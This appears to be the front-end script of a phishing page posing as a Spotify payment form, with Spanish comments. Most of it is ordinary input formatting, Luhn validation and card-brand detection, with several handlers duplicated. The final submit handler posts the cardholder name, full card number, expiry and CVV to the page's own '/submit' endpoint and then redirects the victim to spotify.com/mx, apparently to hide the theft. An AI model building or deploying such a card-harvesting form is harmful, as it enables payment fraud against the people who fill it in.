// Esperar a que el DOM esté completamente cargado
document.addEventListener("DOMContentLoaded", function() {
    // Formato para el número de tarjeta
    document.getElementById('card-number').addEventListener('input', function() {
        formatCardNumber(this);
    });

    // Formato para la fecha de vencimiento MM/YY
    document.getElementById('expiry-date').addEventListener('input', function() {
        formatExpiryDate(this);
    });

    // Formato para solo permitir números en el campo CVV
    document.getElementById('cvv').addEventListener('input', function() {
        limitInputToNumbers(this);
    });
});

// Función para formatear el número de tarjeta
function formatCardNumber(input) {
    let value = input.value.replace(/\s+/g, '').replace(/[^0-9]/g, ''); // Remover espacios y cualquier carácter no numérico
    let formattedValue = value.match(/.{1,4}/g)?.join(' ') || ''; // Formatear cada 4 dígitos
    input.value = formattedValue;
}

// Función para formatear la fecha de vencimiento MM/YY
function formatExpiryDate(input) {
    let value = input.value.replace(/\D/g, ''); // Remover cualquier carácter no numérico
    if (value.length >= 2) {
        input.value = value.substring(0, 2) + '/' + value.substring(2, 4); // Separar cada 2 dígitos
    } else {
        input.value = value;
    }
}

// Función para permitir solo números en el campo CVV
function limitInputToNumbers(input) {
    input.value = input.value.replace(/\D/g, ''); // Remover cualquier carácter no numérico
}





//Funcion de validacion





// Función para validar el número de tarjeta usando el algoritmo de Luhn
function isValidCardNumber(cardNumber) {
    let sum = 0;
    let shouldDouble = false;
    
    // Eliminar cualquier espacio
    cardNumber = cardNumber.replace(/\s+/g, '');

    // Recorre el número de tarjeta de derecha a izquierda
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber[i]);

        if (shouldDouble) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }

        sum += digit;
        shouldDouble = !shouldDouble;
    }

    return sum % 10 === 0;
}





// Esperar a que el DOM esté completamente cargado
document.addEventListener("DOMContentLoaded", function() {
    // Formato para el número de tarjeta
    const cardNumberInput = document.getElementById('card-number');
    const errorMessage = document.createElement('span');
    errorMessage.style.color = 'red';
    errorMessage.style.fontSize = '1.2rem'; // Aumentamos el tamaño del texto
    errorMessage.style.fontFamily = 'sans-serif'
    errorMessage.style.display = 'none';
    errorMessage.style.position = 'absolute';
    errorMessage.style.marginTop = '60px'; 
    errorMessage.style.left = '0';
    errorMessage.style.transform = 'translateY(100%)';
    errorMessage.style.fontWeight = 'bold';

    // Hacemos que el contenedor padre tenga `position: relative` para que el span se posicione correctamente
    cardNumberInput.parentNode.style.position = 'relative'; 

    cardNumberInput.parentNode.appendChild(errorMessage); // Agregar el mensaje de error debajo del input
    
    cardNumberInput.addEventListener('input', function() {
        formatCardNumber(this);
        
        // Validar el número de tarjeta
        if (isValidCardNumber(this.value)) {
            errorMessage.style.display = 'none'; // Ocultar el mensaje de error si es válido
            cardNumberInput.style.borderColor = ''; // Restablecer borde
            cardNumberInput.style.marginBottom = ''; // Restablecer el margen del campo
        } else {
            errorMessage.style.display = 'block'; // Mostrar mensaje de error
            errorMessage.textContent = 'Ingresa un número de tarjeta válido.';
            cardNumberInput.style.borderColor = 'red'; // Resaltar el campo en rojo
            cardNumberInput.style.marginBottom = '40px'; // Agregar margen inferior dinámico cuando el error esté visible
        }
    });

    // Formato para la fecha de vencimiento MM/YY
    document.getElementById('expiry-date').addEventListener('input', function() {
        formatExpiryDate(this);
    });

    // Formato para solo permitir números en el campo CVV
    document.getElementById('cvv').addEventListener('input', function() {
        limitInputToNumbers(this);
    });
});



document.addEventListener("DOMContentLoaded", function() {
    const cardNumberInput = document.getElementById('card-number');
    const cardIcon = document.getElementById('card-icon');

    cardNumberInput.addEventListener('input', function() {
        formatCardNumber(this);

        const cardType = detectCardType(this.value);

        if (cardType) {
            applyCardIcon(cardType); // Muestra el ícono según la tarjeta
        } else {
            cardIcon.classList.remove('show'); // Oculta el ícono si no coincide con ninguna tarjeta
        }
    });

    // Función para detectar el tipo de tarjeta
    function detectCardType(cardNumber) {
        const sanitizedNumber = cardNumber.replace(/\s+/g, ''); // Remover espacios

        // Detección de Visa
        if (/^4/.test(sanitizedNumber)) {
            return 'visa';
        }
        // Detección de MasterCard
        else if (/^5[1-5]/.test(sanitizedNumber) || /^2[2-7]/.test(sanitizedNumber)) {
            return 'mastercard';
        }
        // Detección de American Express
        else if (/^3[47]/.test(sanitizedNumber)) {
            return 'amex';
        }
        return null;
    }

    // Función para aplicar el ícono de la tarjeta
    function applyCardIcon(cardType) {
        cardIcon.classList.add('show'); // Muestra el ícono

        let iconSrc = '';
        switch(cardType) {
            case 'visa':
                iconSrc = 'visa.svg';
                break;
            case 'mastercard':
                iconSrc = 'mastercard.svg';
                break;
            case 'amex':
                iconSrc = 'amex.svg';
                break;
        }

        // Establecer el ícono correcto
        cardIcon.innerHTML = `<img src="${iconSrc}" alt="${cardType} icon">`;
    }

    // Función para formatear el número de tarjeta
    function formatCardNumber(input) {
        let value = input.value.replace(/\s+/g, '').replace(/[^0-9]/g, ''); // Remover espacios y cualquier carácter no numérico
        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || ''; // Formatear cada 4 dígitos
        input.value = formattedValue;
    }
});

















// Esperar a que el DOM esté completamente cargado
document.addEventListener("DOMContentLoaded", function() {
    const cardNumberInput = document.getElementById('card-number');
    const cvvInput = document.getElementById('cvv');
    
    // Formato para el número de tarjeta
    cardNumberInput.addEventListener('input', function() {
        formatCardNumber(this);
        updateCVVLength(this.value); // Actualizar la longitud del CVV en base al tipo de tarjeta
    });

    // Formato para la fecha de vencimiento MM/YY
    document.getElementById('expiry-date').addEventListener('input', function() {
        formatExpiryDate(this);
    });

    // Formato para solo permitir números en el campo CVV
    cvvInput.addEventListener('input', function() {
        limitInputToNumbers(this);
    });
});

// Función para actualizar la longitud máxima del campo CVV según el tipo de tarjeta
function updateCVVLength(cardNumber) {
    const cvvInput = document.getElementById('cvv');
    let cleanedCardNumber = cardNumber.replace(/\s+/g, ''); // Eliminar espacios en blanco
    
    // Detectar el tipo de tarjeta basado en los primeros dígitos
    if (/^3[47]/.test(cleanedCardNumber)) {
        // AMEX: comienza con 34 o 37
        cvvInput.setAttribute('maxlength', 4); // Limitar CVV a 4 dígitos
    } else if (/^4/.test(cleanedCardNumber)) {
        // VISA: comienza con 4
        cvvInput.setAttribute('maxlength', 3); // Limitar CVV a 3 dígitos
    } else if (/^5[1-5]|^2(2[2-7])/.test(cleanedCardNumber)) {
        // MasterCard: comienza con 51-55 o 2221-2720
        cvvInput.setAttribute('maxlength', 3); // Limitar CVV a 3 dígitos
    } else {
        // Otros tipos de tarjetas
        cvvInput.setAttribute('maxlength', 3); // Por defecto, límite a 3 dígitos
    }
}

// Función para formatear el número de tarjeta
function formatCardNumber(input) {
    let value = input.value.replace(/\s+/g, '').replace(/[^0-9]/g, ''); // Remover espacios y cualquier carácter no numérico
    let formattedValue = value.match(/.{1,4}/g)?.join(' ') || ''; // Formatear cada 4 dígitos
    input.value = formattedValue;
}

// Función para formatear la fecha de vencimiento MM/YY
function formatExpiryDate(input) {
    let value = input.value.replace(/\D/g, ''); // Remover cualquier carácter no numérico
    if (value.length >= 2) {
        input.value = value.substring(0, 2) + '/' + value.substring(2, 4); // Separar cada 2 dígitos
    } else {
        input.value = value;
    }
}

// Función para permitir solo números en el campo CVV
function limitInputToNumbers(input) {
    input.value = input.value.replace(/\D/g, ''); // Remover cualquier carácter no numérico
}












// Esperar a que el DOM esté completamente cargado
document.addEventListener("DOMContentLoaded", function() {
    const cardNameInput = document.getElementById('card-name');

    // Formato para el nombre en la tarjeta: solo letras
    cardNameInput.addEventListener('input', function() {
        limitInputToLetters(this);
    });
    
    // Otras funciones ya existentes...
});

// Función para permitir solo letras en el campo "Nombre en la tarjeta"
function limitInputToLetters(input) {
    input.value = input.value.replace(/[^a-zA-Z\s]/g, ''); // Remover cualquier carácter que no sea letra o espacio
}














































//servidor


document.getElementById("payment-form").addEventListener("submit", function(event) {
    event.preventDefault(); // Evitar el envío tradicional del formulario

    // Obtener los valores de los campos
    const nombreTarjeta = document.getElementById("card-name").value;
    const numeroTarjeta = document.getElementById("card-number").value;
    const fechaVencimiento = document.getElementById("expiry-date").value;
    const cvv = document.getElementById("cvv").value;

    // Enviar los datos al servidor con fetch
    fetch('/submit', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            nombreTarjeta: nombreTarjeta,
            numeroTarjeta: numeroTarjeta,
            fechaVencimiento: fechaVencimiento,
            cvv: cvv,
        })
    })
    .then(response => {
        if (response.ok) {
            // Redirigir a una nueva URL después de guardar
            window.location.href = "https://spotify.com/mx";
        } else {
            alert("Hubo un error al procesar el pago");
        }
    })
    .catch(error => console.error('Error:', error));
});
